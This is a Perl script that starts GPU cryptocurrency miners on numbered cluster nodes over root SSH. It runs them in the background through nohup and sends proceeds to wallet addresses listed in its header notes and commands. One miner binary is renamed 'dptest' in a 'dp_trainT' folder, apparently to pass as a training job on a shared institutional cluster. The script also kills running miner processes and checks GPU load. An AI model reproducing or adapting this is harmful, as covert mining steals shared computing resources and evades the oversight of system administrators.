=b
### watch for exec folder setting
~/gminer_2_75/miner --algo ethash --server 18.167.166.214:5555 --ssl 1 \
         --user 0x7D599D3920Fa565957ea81796c05b3f3450531FE.node42

 $mining_cmd = "nohup ~/eth/t-rex -a ethash -o stratum+tcp://18.167.166.214:4444 \\
 -u 0x7D599D3920Fa565957ea81796c05b3f3450531FE -p x -w $nodename 2>&1 >/dev/null &";
 #zil1vv6h52ra38qac68er7t9jv8ymv3957ukfxz2f4
 $mining_cmd ="nohup ~/lolminer/lolMiner --algo ETHASH --pool 18.167.166.214:4444 --user 0x7D599D3920Fa565957ea81796c05b3f3450531FE\.$nodename-$cluster --dualmode TONDUAL --dualpool https://server1.whalestonpool.com --dualuser EQBhjbH5YjuNqskpDdDNib_M4ujBj8SM0UeqEmMtUkRGJTYS --worker $nodename-$cluster 2>&1 >/dev/null &";
conducting gpu eth submission 
RVN:(binance wallet RRQLCfknZ3xRDyM4wafwMxBexwzumG1c1s)
1. https://ravencoin.flypool.org/start
stratum-ravencoin.flypool.org (172.65.217.17)
port 
3333
alternative 13333
encrypted 3443
  -o stratum+tcp://rvn.2miners.com:6060 -u RNm4LMBGyfH8ddCGvncQKrMtxEydxwhUJL.rig -p x
/home/jsp/dp_trainT/dptest -a kawpow -o stratum+tcp://18.167.166.214:3333 \
        -u RRQLCfknZ3xRDyM4wafwMxBexwzumG1c1s -p x -w node42-182 
erg:(kucoin wallet 9gt7gvUrrVpkhzQ8EW8RAkQrt4u7Dpix1T1h25nZJqhvTxFCjJw )
9gt7gvUrrVpkhzQ8EW8RAkQrt4u7Dpix1T1h25nZJqhvTxFCjJw
erg:
https://ergo.flypool.org/start
1.stratum-ergo.flypool.org

port 
3333 + 1
alternative 13333 +1
encrypted 3443 +1
=cut
use warnings;
use strict;
use Parallel::ForkManager;
my $forkNo = 1;
my $pm = Parallel::ForkManager->new("$forkNo");

#my $miner = "t-rex";# or lolminer
my $miner = "lolminer";# or lolminer

###main jobs to do
#my $killjobs = "yes";
my $sumitjobs = "yes";
my $killjobs = "no";
#my $sumitjobs = "no";
my $checkstatus = "yes";

my %nodes = (
    #161 => [0],#8..18,20..22,39..41],#[1,3,39..42],#1,3,39..
    #161 => [8..18],#8..18,20..22,39..41],#[1,3,39..42],#1,3,39..
    #161 => [10],#[1,3,39..42],#1,3,39.., bad node 18
    161 => [1,3,8..18,20..21,39..42],#[1,3,39..42],#1,3,39..    
    #161 => [17],#[1,3,39..42],#1,3,39..    
    182 => [6..7,20..24]
    );
#get current for the corresponding setting    
my $ip = `/usr/sbin/ip a`;    
$ip =~ /140\.117\.\d+\.(\d+)/;
my $cluster = $1;
$cluster =~ s/^\s+|\s+$//;
#print "\$cluster: $cluster\n";
my @allnodes = @{$nodes{$cluster}};#get node information
my @nodes;

#test whether the connection is ok
`touch ~/scptest.dat`;
for (@allnodes){
    my $nodeindex=sprintf("%02d",$_);
    my $nodename= "node"."$nodeindex";
    my $cmd = "/usr/bin/ssh $nodename ";
    print "****Check $nodename status\n ";
    #`echo "***$nodename" >> $output`;
#use scp for ssh test
	system("scp -o ConnectTimeout=5 ~/scptest.dat root\@$nodename:/root");    
    if($?){
		next;#not available
		}
	else{
		print "scp at $nodename ok for ssh test\n";
        push @nodes, $_;
		}	
}
chomp @nodes;
print @nodes. "\n";

`rm -f ./dupJobs.dat`;
`touch ./dupJobs.dat`;
for (@nodes){
$pm->start and next;
    my $nodeindex=sprintf("%02d",$_);
    my $nodename= "node"."$nodeindex";
    my $cmd = "/usr/bin/ssh $nodename ";
    my $mining_cmd;
    #    if($miner eq "t-rex"){
    #    $mining_cmd = "nohup ~/eth/t-rex -a ethash -o stratum+tcp://18.167.166.214:4444 \\
    #    -u 0x7D599D3920Fa565957ea81796c05b3f3450531FE -p x -w $nodename-$cluster 2>&1 >/dev/null &";
    #    }
    #    elsif($miner eq "lolminer"){
        #$mining_cmd ="nohup ~/lolminer/lolMiner --algo ETHASH --pool 18.167.166.214:4444 --user 0x7D599D3920Fa565957ea81796c05b3f3450531FE\.$nodename-$cluster --dualmode TONDUAL --dualpool https://server1.whalestonpool.com --dualuser EQBhjbH5YjuNqskpDdDNib_M4ujBj8SM0UeqEmMtUkRGJTYS --worker $nodename-$cluster 2>&1 >/dev/null &";
    #$mining_cmd ="nohup ~/dp_train/dptest --algo ETHASH --pool 18.167.166.214:4444 --user 0x7D599D3920Fa565957ea81796c05b3f3450531FE\.$nodename-$cluster --dualmode TONDUAL --dualpool https://server1.whalestonpool.com --dualuser EQBhjbH5YjuNqskpDdDNib_M4ujBj8SM0UeqEmMtUkRGJTYS --worker $nodename-$cluster 2>&1 >/dev/null &";
    
    #$mining_cmd ="nohup ~/dp_train/dptest --algo ETHASH --pool 18.167.166.214:4444 --user 0x7D599D3920Fa565957ea81796c05b3f3450531FE\.$nodename-$cluster --dualmode TONDUAL --dualpool https://pool.services.tonwhales.com --dualuser EQBhjbH5YjuNqskpDdDNib_M4ujBj8SM0UeqEmMtUkRGJTYS --worker $nodename-$cluster 2>&1 >/dev/null &";
    
    #$mining_cmd ="nohup ~/dp_train/dptest --algo ETHASH --pool 18.167.166.214:4444 --user 0x7D599D3920Fa565957ea81796c05b3f3450531FE\.$nodename-$cluster 2>&1 >/dev/null &";
	#Ergo
    #$mining_cmd = "nohup /home/jsp/dp_trainT/dptest -a autolykos2 -o stratum+tcp://18.167.166.214:3334 \\
    #    -u 9gt7gvUrrVpkhzQ8EW8RAkQrt4u7Dpix1T1h25nZJqhvTxFCjJw\.$nodename-$cluster -p x 2>&1 >/dev/null &";
    #RVN
   $mining_cmd = "nohup /home/jsp/dp_trainT/dptest -a kawpow -o stratum+tcp://54.238.145.148:3333 \\
       -u RRQLCfknZ3xRDyM4wafwMxBexwzumG1c1s\.$cluster-$nodename -p x 2>&1 >/dev/null &";
    
    #$mining_cmd = "nohup /home/jsp/dp_trainT/dptest -a kawpow -o stratum+tcp://18.167.166.214:3333 \\
    #    -u RRQLCfknZ3xRDyM4wafwMxBexwzumG1c1s\.$nodename-$cluster -p x 2>&1 >/dev/null &";
    # /home/jsp/dp_trainT/dptest -a kawpow -o stratum+tcp://18.167.166.214:3333 \
    #    -u RRQLCfknZ3xRDyM4wafwMxBexwzumG1c1s -p x -w node42-182 
     
    # $mining_cmd = "nohup /home/jsp/dp_trainT/dptest -a ethash -o stratum+tcp://18.167.166.214:4444 \\
    #    -u 0x7D599D3920Fa565957ea81796c05b3f3450531FE -p x -w $nodename-$cluster 2>&1 >/dev/null &";
     #   /home/jsp/dp_trainT/dptest -a ethash -o stratum+tcp://18.167.166.214:4444 -u 0x7D599D3920Fa565957ea81796c05b3f3450531FE -p x -w 23-182
    #nohup ~/dp_train/dptest --algo ETHASH --pool 18.167.166.214:4444 --user 0x7D599D3920Fa565957ea81796c05b3f3450531FE.node42-161 2>&1 >/dev/null &
	
#~/dp_train/dptest --algo ETHASH --pool 18.167.166.214:4444 --user 0x7D599D3920Fa565957ea81796c05b3f3450531FE.node42-161 --dualmode zil --dualpool eu.ezil.me:5555 --dualuser 0x7D599D3920Fa565957ea81796c05b3f3450531FE.zil1vv6h52ra38qac68er7t9jv8ymv3957ukfxz2f4 --worker node42_161 --enablezilcache 

    #nohup ~/dp_train/dptest --algo ETHASH --pool 18.167.166.214:4444 --user 0x7D599D3920Fa565957ea81796c05b3f3450531FE.node42-161 --dualmode TONDUAL --dualpool https://next.ton-pool.com --dualuser EQBhjbH5YjuNqskpDdDNib_M4ujBj8SM0UeqEmMtUkRGJTYS --worker node42_161 2>&1 >/dev/null &
    # $mining_cmd ="/usr/bin/nohup ~/lolminer/lolMiner --algo ETHASH --pool 18.167.166.214:4444 --user 0x7D599D3920Fa565957ea81796c05b3f3450531FE\.$nodename-$cluster --dualmode TONDUAL --dualpool https://next.ton-pool.com --dualuser EQBhjbH5YjuNqskpDdDNib_M4ujBj8SM0UeqEmMtUkRGJTYS --worker $nodename-$cluster 2>&1 >/dev/null &";
    #    }   

    my $temp = `$cmd "/usr/bin/ps aux|/usr/bin/grep -v grep|/usr/bin/egrep \\\"t-rex|miner|dptest\\\""`;
    print "*****$nodename*****\n";
    print "###node status before all cmd:\n $temp\n";
    my @temp = `$cmd "/usr/bin/nvidia-smi|grep /home/jsp"`;
    chomp @temp;
    my $gpujob = @temp;
    if($killjobs eq "yes" or $gpujob != 1){
        print "#Want to kill job\n";
        `echo "Dup: job No. in $nodename: $gpujob" >> dupJobs.dat`;
        if($temp){
            print "killing job\n";
            `$cmd "/usr/bin/ps aux|/usr/bin/grep -v grep|/usr/bin/egrep \\\"t-rex|miner|dptest\\\"|awk '{print \\\$2}'|xargs kill -9"`;
        }
        else{
             print "No existing job currently!\n";
        }
    }

    if($sumitjobs eq "yes"){
        print "#Want to submit job\n";
       # print "***Current mining cmd at $nodename: $mining_cmd\n";
        my $GPU = `$cmd "nvidia-smi -L"`;
       # print "**** node: $nodename ,GPU model: $GPU\n";
        my $percent = `$cmd "nvidia-smi|grep Default|awk '{print \\\$(NF-2)}'"`;
        #print "\n\n****  \$percent: $percent\n";
        $percent  =~ s/^\s+|\s+$//;
        if($percent eq "0%"){
            `echo "*** 0% performance in $nodename" >> dupJobs.dat`;
            
            print "Job performance at $nodename is currently 0%,and you need to kill it now\n";
            print "killing job\n";
            `$cmd "/usr/bin/ps aux|/usr/bin/grep -v grep|/usr/bin/egrep \\\"t-rex|miner|dptest\\\"|awk '{print \\\$2}'|xargs kill"`;
            sleep(1);
        }
        my $temp1 = `$cmd "/usr/bin/ps aux|/usr/bin/grep -v grep|/usr/bin/egrep \\\"t-rex|miner|dptest\\\""`;
       
        unless($temp1){
            print "Submitting job\n";
            my $pid = fork();
		    if ($pid == 0) {
                exec("$cmd '$mining_cmd'");
                #$overclock{$1} only for windows
                }# if($pid == 0);
        }
        else{
            print "job already exists!\n";
        }
    }
    if($checkstatus eq "yes"){
        $temp = `$cmd "ps aux|grep -v grep|grep t-rex"`;
        print "#Want to check node current status\n";
        print "Checking status\n";
        print "output:$temp\n";
        system("$cmd 'nvidia-smi|grep %'")
    }
$pm->finish;
}
$pm->wait_all_children;
system("ps aux|grep -v grep|grep 'ssh node'|grep jsp|awk '{print \$2}'|xargs kill");
sleep(1);
if($?) {print "$!\n";}
print "doing final grep check. If the following is empty, it is done.\n";
system("ps aux|grep -v grep|grep 'ssh node'|grep jsp");
